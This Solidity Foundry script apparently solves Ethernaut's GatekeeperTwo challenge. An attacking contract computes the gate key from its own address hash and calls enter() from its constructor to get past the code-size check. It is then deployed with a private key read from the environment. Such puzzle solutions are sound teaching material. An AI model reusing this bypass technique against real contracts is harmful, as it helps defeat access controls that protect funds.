// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level14.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{
    constructor(){ 
        GatekeeperTwo  instance = GatekeeperTwo(0xc3FB4c38f398050206ea0D07D18D693Bc75888AA) ;
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        instance.enter(gateKey);
    }   
}

contract Level14Sol is Script{
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack();
        vm.stopBroadcast();
    }
}
